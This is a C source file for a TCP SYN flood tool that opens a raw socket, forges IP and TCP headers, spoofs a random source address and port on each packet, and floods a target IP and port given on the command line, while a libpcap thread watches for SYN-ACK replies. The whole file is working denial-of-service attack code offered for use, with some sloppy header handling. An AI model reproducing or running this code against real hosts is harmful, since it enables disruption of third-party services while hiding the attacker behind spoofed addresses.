#include <pcap.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <pthread.h>
#define MAX_PACKET_SIZE 4096
#define TCPSYN_LEN 20
#define MAXBYTES2CAPTURE 2048
pthread_t one;char value[100];
unsigned short csum (unsigned short *buf, int nwords)
{
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}
void setup_ip_header(struct iphdr *iph)
{    
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;    
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}
void setup_tcp_header(struct tcphdr *tcph)
{
    tcph->source = htons(5678);
    tcph->seq = random();
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5;
    tcph->fin=0;
    tcph->syn=1;
    tcph->rst=0;
    tcph->psh=0;
    tcph->ack=0;
    tcph->urg=0;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;     
}
void got_packet(u_char *args, const struct pcap_pkthdr *header,const u_char *packet)
{
      struct ip *iphdr = NULL;
      struct tcphdr *tcphdr = NULL;
      iphdr = (struct ip *)(packet+14);
      tcphdr = (struct tcphdr *)(packet+14+20);  
      printf("\t Flags -- 0x%X\n", tcphdr->th_flags); // 0x12 is syn-ack
      /* If a new SYN-ACK is received */
      if(tcphdr->th_flags == 0x12)
       printf("\nSYN-ACK received\n");
}
void *control()
{
    bpf_u_int32 netaddr=0, mask=0;    
    struct bpf_program filter;       
    char errbuf[PCAP_ERRBUF_SIZE];  
    pcap_t *descr = NULL;            
    struct pcap_pkthdr pkthdr;       
    const unsigned char *packet=NULL; 
    memset(errbuf,0,PCAP_ERRBUF_SIZE); 
     if( pcap_lookupnet( "eth0" , &netaddr, &mask, errbuf) == -1){
         fprintf(stderr, "ERROR1: %s\n", errbuf);
        pthread_exit((void*) 0);
     }
     if ((descr = pcap_open_live("eth0", MAXBYTES2CAPTURE, 0,  0, errbuf))==NULL){
        fprintf(stderr, "ERROR2: %s\n", errbuf);
        pthread_exit((void*) 0);
     }
     if (pcap_compile(descr, &filter, value, 1, mask) == -1){//TRIAL
        fprintf(stderr, "ERROR3: %s\n", pcap_geterr(descr) );
        pthread_exit((void*) 0);
     }
     if (pcap_setfilter(descr,&filter) == -1){
        fprintf(stderr, "ERROR4: %s\n", pcap_geterr(descr) );
        pthread_exit((void*) 0);
     }
     while(1)
     { 
      pcap_loop(descr,-1,got_packet,NULL);
     } 
     pthread_exit((void*) 0);
}
int main(int argc, char *argv[ ])
{   
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)((u_int8_t *)iph + (5 * sizeof(u_int32_t)));
    struct sockaddr_in sin;
    char new_ip[sizeof "255.255.255.255"];
    
    if(argc != 3){
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "Usage: %s <target IP/hostname> <port to be flooded>\n", argv[0]);
        exit(-1);
    }
    // sprintf(value,"tcp[13] & 2 != 0");//TRIAL
    sprintf(value,"tcp");//TRIAL
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);    
    if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }        
    
    unsigned int floodport = atoi(argv[2]);
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(argv[1]);
 
    // Clear the data
    memset(datagram, 0, MAX_PACKET_SIZE);
    // Set appropriate fields in headers
    setup_ip_header(iph);
    setup_tcp_header(tcph);   
 
    tcph->dest = htons(floodport);
 
    iph->daddr = sin.sin_addr.s_addr;    
    iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
 
    /* a IP_HDRINCL call, to make sure that the kernel knows
    *     the header is included in the data, and doesn't insert
    *     its own header into the packet before our data 
    */    
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");  
        exit(-1);
    }
    pthread_create(&one, NULL, control, NULL);
    for(;;){
        if(sendto(s,      /* our socket */
            datagram,         /* the buffer containing headers and data */
            iph->tot_len,     /* total length of our datagram */
            0,        /* routing flags, normally always 0 */
            (struct sockaddr *) &sin,   /* socket addr, just like in */
            sizeof(sin)) < 0)     /* a normal send() */
 
            fprintf(stderr, "sendto() error!!!.\n");
        else
            fprintf(stdout, "Flooding %s at %u...\n", argv[1], floodport);       
 
            // Randomize source IP and source port
            snprintf(new_ip,16,"%lu.%lu.%lu.%lu",random() % 255,random() % 255,random() % 255,random() % 255);
            iph->saddr = inet_addr(new_ip);       
            tcph->source = htons(random() % 65535);
            iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
            sleep(1);
    }
 
    return 0;
}
